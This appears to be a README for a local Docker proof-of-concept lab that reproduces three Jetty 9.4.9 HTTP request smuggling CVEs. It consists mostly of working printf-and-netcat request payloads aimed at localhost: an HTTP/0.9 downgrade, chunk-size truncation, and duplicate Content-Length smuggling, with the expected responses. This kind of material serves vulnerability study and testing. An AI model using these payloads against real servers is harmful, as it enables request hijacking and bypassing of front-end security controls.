#	Jetty - Http Smuggling

##	Composition

jetty 9.4.9



##	Usage

Only for POC.

###	build

```bash
docker-compose up
```

The jetty server will on the port 9014.



###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 200 OK
```

1 HTTP code 200 means all right! 

Enjoy!



###	reproduce

####	CVE-2017-7656 HTTP/0.9

```bash
printf 'GET /?test=4564 HTTP/0.9\r\n\r\n'|nc -q 1 127.0.0.1 9014
```

You will get an http/0.9 response. No headers is right. HTTP/0.9 responses don't have headers.

```html
<html>
<head>
<title>Sample "Hello, World" Application</title>
</head>
<body bgcolor=white>

<table border="0">
<tr>
<td>
<img src="images/tomcat.gif">
</td>
<td>
<h1>Sample "Hello, World" Application</h1>
<p>This is the home page for a sample application used to illustrate the
source directory organization of a web application utilizing the principles
outlined in the Application Developer's Guide.
</td>
</tr>
</table>

<p>To prove that they work, you can execute either of the following links:
<ul>
<li>To a <a href="hello.jsp">JSP page</a>.
<li>To a <a href="hello">servlet</a>.
</ul>

</body>
</html>
```



####	CVE-2017-7657 Chunk size attribute truncation

```bash
printf 'POST /?test=4973 HTTP/1.1\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Content-Type: application/x-www-form-urlencoded\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'100000000\r\n'\
'\r\n'\
'POST /?test=4974 HTTP/1.1\r\n'\
'Content-Length: 5\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
|nc 127.0.0.1 9014|grep "HTTP/1.1"
```

You will get two 200 codes. 

Try this:

```bash
printf 'POST /?test=4975 HTTP/1.1\r\n'\
'Transfer-Encoding: chunked\r\n'\
'Content-Type: application/x-www-form-urlencoded\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'1ff00000008\r\n'\
'abcdefgh\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'POST /?test=4976 HTTP/1.1\r\n'\
'Content-Length: 5\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 9014|grep "HTTP/1.1"
```

You will get two 200 codes, too.

Jetty will cut the long size to short size. For example, the first time we tried, size is 100000000. It will be treated as 0. The second time we tried, size is 1ff00000008. It will be treated as 8.

So both of these, we will get two responses.



####	CVE-2017-7658 Double Content-Length

```bash
printf 'GET /?test=4966 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Connection: keepalive\r\n'\
'Content-Length: 45\r\n'\
'Content-Length: 0\r\n'\
'\r\n'\
'GET /?test=4967 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
|nc 127.0.0.1 9014
```

We will get

```
HTTP/1.1 400 Duplicate Content-Length
Content-Type: text/html;charset=iso-8859-1
Content-Length: 67
Connection: close
Server: Jetty(9.4.9.v20180320)

<h1>Bad Message 400</h1><pre>reason: Duplicate Content-Length</pre>
```

But when we try this:

```bash
printf 'GET /?test=4968 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Connection: keepalive\r\n'\
'Content-Length: 0\r\n'\
'Content-Length: 45\r\n'\
'\r\n'\
'GET /?test=4969 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
|nc 127.0.0.1 9014
```

We will get a 200 code. So let's smuggle.

```bash
printf 'GET /?test=4970 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Connection: keepalive\r\n'\
'Content-Length: 0\r\n'\
'Content-Length: 45\r\n'\
'\r\n'\
'GET /?test=4971 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
'GET /?test=4972 HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'\r\n'\
|nc 127.0.0.1 9014
```

We will get two 200 codes.



#	Reference

https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc3

https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/